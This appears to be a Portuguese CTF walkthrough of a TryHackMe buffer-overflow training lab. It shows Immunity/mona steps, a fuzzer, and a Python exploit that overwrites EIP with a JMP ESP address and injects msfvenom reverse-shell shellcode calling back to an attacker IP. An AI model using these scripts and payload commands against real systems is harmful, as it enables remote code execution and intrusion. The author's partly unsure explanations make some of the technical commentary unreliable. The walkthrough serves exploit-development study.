# Walkthrough do OSCP BOF Prep - tryhackme.com

### _Utilities:_

```bash
cd ~/captureTheFlag/tryHackMe/oscpBofPrep
clear


xfreerdp /u:admin /p:password /cert:ignore /v:$(<target)
```

---

## oscp.exe - OVERFLOW1

#### Mona commands

```bash
!mona config -set workingfolder c:\mona\%p
!mona findmsp -distance 2400
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a 0187FA30  # ESP value
!mona bytearray -b "\x00\x07\x2e\xa0"
!mona jmp -r esp -cpb  "\x00\x07\x2e\xa0"
```

#### MSF commands

```bash
msf-pattern_create -l 2400
msf-pattern_offset -l 2400 -q 6F43396E
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.30.195 LPORT=4444 -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload

```

#### Criação dos scripts em python

_Nota: todos os scripts devem estar na mesma pasta, para que possam importar as definições e variáveis uns dos outros_

-   definitionsOfTheExploit.py - definições e variáveis dos scripts:

```python
#!/usr/bin/python3
import socket


IP = "10.10.144.28"       # Change this to target IP
PORT = 1337			      # Change this to target port
offset = 1978             # Change this when discover the offset EIP number.
COMMAND = b"OVERFLOW1 "   # Command we are testing the buffer overflow exploit

ADDRESS = (IP, PORT)
TIMEOUT = 5



def sendMaliciousCommand(string):
	print("Preparing socket...", end="")
	socketVar = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socketVar.settimeout(TIMEOUT)
	connect = socketVar.connect(ADDRESS)
	socketVar.recv(1024)
	print(f" Sending command with {len(string)} bytes")
	socketVar.send(COMMAND + string  + b"\r\n")
	socketVar.recv(1024)
	socketVar.close()
```

-   fuzzer.py - Serve para checkar aproximadamente a partir de que tamanho o buffer rebenta

```python
#!/usr/bin/python3
from definitionsOfTheExploit import sendMaliciousCommand
from time import sleep
import sys


COUNTER = 100
BUFFER = b"A" * COUNTER
string = BUFFER

print("Starting loop")
while True:
	try:
		sendMaliciousCommand(string)
		string += BUFFER

	except:
		print(f"Fuzzing crashed at {len(string)} bytes.")
		sys.exit(0)
	sleep(1)
```

-   createPatternBadChar.py - Serve para imprimir na tela a sequencia de bytes para encontrar o ponto de chamada da função a burlar, juntamente com o !mona

```python
#!/usr/bin/python3
import subprocess
import sys

pattern = ""

badChars = "\\xzz"
# badChars = "\\x07\\x2e\\xa0"

for x in range(1, 256):
	newChar = "\\x{:02x}".format(x)
	if newChar[2:] not in badChars.split("\\x"):
		pattern += newChar

print(pattern)

```

-   exploit.py - Exploit em si, com várias variáveis, pois cada passo leva ou não partes do comando completo a ser enviado

```python
#!/usr/bin/python3
from definitionsOfTheExploit import sendMaliciousCommand
from definitionsOfTheExploit import offset
import sys


BUFFER = offset * b"A"
POINTER = ""
# POINTER = b"\xaf\x11\x50\x62"
PADDING = ""
# PADDING = b"\x90" * 16

payload = b""
payload += b"\xb8\x9a\x29\x28\x95\xda\xc7\xd9\x74\x24\xf4\x5e"
payload += ...

PATTERN = payload

string = BUFFER + POINTER + PADDING + PATTERN
print(string)


try:
	sendMaliciousCommand(string)
except:
	print(f"Something failed... ")
	sys.exit()
```

## Preparação dos scripts para o exploit final:

-   Iniciar o programa por explorar, em mode debugger, como auxilio de Immunity Debugger (Em modo administrador)
-   Iniciar uma análise do programa com o mona:

```bash
!mona config -set workingfolder c:\mona\%p
```

-   Preencher as variáveis que sabemos no definitionsOfTheExploit.py (IP, PORT, COMMAND). Nota: o COMMAND tem que estar em bytes, usando o 'b' antes de abrir as aspas da string (b"COMANDO")

### Descobrir o tamanho do buffer máximo

-   Executar o fuzzer.py. O mesmo deverá dar um erro quando o alvo deixar de funcionar. A mensagem irá indicar que o fuzzer.py deixou de funcionar quando o comando que foi enviado tinha 2010 bytes. Significa que o buffer é inferior a 2010.
-   Criar um padrão com o MSF para descobrir o tamanho exato do buffer do comando:

```bash
msf-pattern_create -l 2400
```

-   Adicionar o padrão na variável "PATTERN" do exploit.py, sem esquecer o "b" de byte... (elimine todas as outras variáveis. o "offset" das definitionsOfTheExploit.py tambem deve estar a 0, pois ainda não sabemos o tamanho do buffer)
-   Depois de executar o exploit.py, o programa irá para de funcionar pois 2400 bytes é claramente mais que o buffer máximo que aguenta.
-   No Immunity, verificar a variável EIP. Irá estar os seguintes bytes: EIP 6F43396E. Isto é o conjunto de bytes que passou dos limites do buffer. Corresponde a uma parte do nosso padrão que o MSF gerou. Para descobrir o buffer exato, executar o seguinte comando:

```bash
msf-pattern_offset -l 2400 -q 6F43396E
```

[*] Exact match at offset 1978

-   Este é o tamanho máximo do commando. A partir daqui, temos mais uma variável para atribuir valor nas definitionsOfTheExploit.py
-   Para verificar se é verdade, vamos adicionar o valor b"BBBB" á variável PATTERN do nosso exploit. Com isso, e o offset = 1978, podemos executar de novo o exploit.
-   Desta vez, o EIP terá o seguinte valor: EIP 42424242. 42 é o byte do caracter "B", e tendo 4\*"B", percebemos que os BBBB estão logo a seguir ao buffer.
-   A partir de agora, temos de descobrir os badchars... (ainda não percebi bem o que é...). Para isso, criamos um pointer no mona, que irá mapear (qualquer coisa...) com um padrão, que tambem iremos recriar logo a seguir:

```bash
!mona bytearray -b “\x00”
```

-   Criar um padrão igual ao do !mona, com auxilio do createPatternBadChar.py.
-   Com esse padrão, substituir o "PATTERN" do exploit.py, guardando os b"BBBB" e lembrando sempre do "b"zito no ínicio...
-   O programa irá crachar outra vez... com o EIP 42424242 e o padrão a seguir... O mona irá comprar os dois padrões e ver quais bytes faltam. Esses são so BadChars do Pointer a seguir ao fim do buffer.

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 019DFA30 # Estes bytes variam, e são da variável ESP 019DFA30... Penso que é o endereço da memória onde começa a tal sequencia de caracteres a seguir aos b"BBBB"
```

Possíveis badchars: 07 08 2e 2f a0 a1 Nota que normalmente, os bytes que falham fazem buggar o byte a seguir, pelo que normalmente, se dois bytes e apenas dois vierem seguindos, significar que o primeiro é que é um badChar. Neste exemplo, o badChars são "07", "2e" e "a0" que iremos tratar da seguinte forma: \x00\x07\x2e\xa0 (ainda não sei se a ordem é sempre assim crescente, ou se é só facilitismo do exercício, o que sei é que no início, é perciso acrescentar mais um Char: \x00, sendo ele o null byte do fim deste conjunto [o pc lê as merdas de traz para a frente])

-   Temos de confirmar se a sequência é a correta, criando um novo pattern, adicionando esta sequencia à variável "badChar" do createPatternBadChar.py, e colocando a nova sequência de caracteres na variável "PATTERN" do exploit.py. É perciso ainda definir o mona com esse novo patern:

```bash
!mona bytearray -b "\x00\x07\x2e\xa0"
```

-   Depois de executar, verifica-se que não há mais alterações, não há mais badChars. Este é o jump point, é a variável que irá idicar que, depois do fim do buffer, irá saltar para outro ponto do programa, para executar outra coisa. E é exatamente essa coisa que iremos substituir. Resumindo, esgota-se o buffer, para escrever exatamente o mesmo jump point que deveria levar a outra parte do programa, e escrever um reverse shell por cima da informação que tem na memória, que irá ser executado automaticamente.

```bash
!mona jmp -r esp -cpb  "\x00\x07\x2e\xa0"
```

-   Este jump point aponta para um dll, que fica localizado na memória com a localização 0x625011af (\xaf\x11\x50\x62 ao contrário devido ao pc o ler ao contrário). Esse endereço da memória é que é o ponto de partida para o novo payload do tipo reverse shell. Para fazer um reverse shell em bytes, executa-se o msfvenom com os seguintes argumentos:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload
```

irá ficar impresso a nova sequencia de caracteres para por no "PATTERN" do exploit.

-   É importante adicionar também um padding para reescrever ações que não queremos que o código original executa. Normalmente, chega uma coisa pequena: PADDING = b"\x90" \* 16
-   É também necessário adicionar o POINTER = b"\xaf\x11\x50\x62" que encontramos indicando que seria esse ponto que executaria um dll.
-   A partir daí, está feito o nosso reverse shell, é só executar um listener na porta do payload que fizemos com o msfvenom e GG.
